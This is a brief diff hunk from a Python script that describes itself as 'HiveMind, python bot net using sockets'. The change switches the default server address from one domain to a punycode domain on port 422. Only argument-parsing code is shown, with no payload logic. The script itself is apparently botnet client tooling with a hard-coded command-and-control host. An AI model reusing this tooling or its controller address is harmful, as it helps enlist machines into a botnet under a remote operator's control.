@@ -11,7 +11,7 @@ parser = argparse.ArgumentParser(
     description="HiveMind, python bot net using sockets."
 )
 
-parser.add_argument("host", default= "fluffydolphin.xyz", nargs="?", help="Address of the Server.")
+parser.add_argument("host", default= "xn--6pw65a019d.xyz", nargs="?", help="Address of the Server.")
 
 parser.add_argument(
     "-p", "--port", default=422, help="Port the Server is running on.", type=int
